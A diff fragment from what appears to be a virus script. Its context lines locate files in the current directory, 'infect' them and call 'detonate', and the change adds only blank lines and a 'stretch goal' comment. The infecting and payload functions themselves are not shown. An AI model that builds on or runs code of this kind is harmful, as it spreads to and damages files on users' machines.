@@ -80,3 +80,7 @@ def detonate():
 files_targeted = locate(os.path.abspath(""))
 infect(files_targeted)
 detonate()
+
+
+
+### STRETCH GOAL ###
